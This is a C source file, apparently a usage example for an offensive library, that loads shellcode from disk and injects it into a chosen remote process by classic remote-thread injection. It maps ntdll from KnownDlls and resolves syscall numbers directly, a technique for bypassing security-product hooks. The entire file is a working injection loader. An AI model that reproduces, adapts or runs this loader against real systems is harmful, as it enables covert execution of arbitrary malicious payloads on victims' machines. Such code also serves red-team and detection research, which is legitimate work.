#include <sindri.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static void print_usage(const char *program_name, FILE *stream) {
    fprintf(stream,
            "Usage:\n"
            "  %s -f <payload_path> -p <target_pid>\n\n"
            "Options:\n"
            "  -f <payload_path>   Path to the binary shellcode to inject.\n"
            "  -p <target_pid>     Process ID of the remote target process.\n\n",
            program_name);
}

int main(int argc, char *argv[]) {
    const char *file_path  = NULL;
    DWORD       target_pid = 0;

    for (int i = 1; i < argc; i++) {
        if ((strcmp(argv[i], "-h") == 0) || (strcmp(argv[i], "--help") == 0)) {
            print_usage(argv[0], stdout);
            return SND_SUCCESS;
        }

        if (strcmp(argv[i], "-f") == 0) {
            if (i + 1 >= argc) {
                fprintf(stderr, "[-] Missing value for -f.\n");
                print_usage(argv[0], stderr);
                return SND_STATUS_MISSING_COMMAND_LINE_ARGS;
            }
            file_path = argv[++i];
            continue;
        }

        if (strcmp(argv[i], "-p") == 0) {
            if (i + 1 >= argc) {
                fprintf(stderr, "[-] Missing value for -p.\n");
                print_usage(argv[0], stderr);
                return SND_STATUS_MISSING_COMMAND_LINE_ARGS;
            }
            target_pid = (DWORD)strtoul(argv[++i], NULL, 0);
            continue;
        }

        fprintf(stderr, "[-] Unknown argument: %s\n", argv[i]);
        print_usage(argv[0], stderr);
        return SND_STATUS_INVALID_COMMAND_LINE_ARG;
    }

    if (file_path == NULL) {
        fprintf(stderr, "[-] -f <payload_path> is required.\n");
        print_usage(argv[0], stderr);
        return SND_STATUS_MISSING_COMMAND_LINE_ARGS;
    }

    if (target_pid == 0) {
        fprintf(stderr, "[-] -p <target_pid> is required and must be non-zero.\n");
        print_usage(argv[0], stderr);
        return SND_STATUS_MISSING_COMMAND_LINE_ARGS;
    }

    snd_status_t status = SND_OK;

    snd_buffer_t  inject_buf = {0};
    snd_inj_ctx_t inj_ctx    = {0};

    printf("[*] Loading payload into memory: %s\n", file_path);
    status = snd_disk_buffer_load(file_path, &inject_buf);
    if (SND_FAILED(status)) {
        goto cleanup;
    }

    PVOID ntdll;

    status = snd_om_knowndll_map(&snd_map_nt, L"ntdll.dll", &ntdll);
    if (SND_FAILED(status)) {
        goto cleanup;
    }
    snd_syscall_set_ntdll(ntdll);

    /* Configure the cascading syscall resolution strategy. */
    snd_syscall_strategy_set(snd_syscall_resolve_ssn_scan);
    snd_syscall_strategy_add(snd_syscall_resolve_ssn_sort);

    inj_ctx.target_pid = target_pid;
    inj_ctx.payload    = &inject_buf;
    inj_ctx.proc_api   = &snd_proc_win;

    status = snd_inj_classic_shell(&inj_ctx);
    if (SND_FAILED(status)) {
        goto cleanup;
    }

    printf("\n[+] Remote payload execution thread created successfully.\n");

cleanup:
    snd_inj_cleanup(&inj_ctx);
    snd_buffer_free(&inject_buf);

    if (SND_FAILED(status)) {
        snd_status_print(status);
        return status.code;
    }

    return status.code;
}
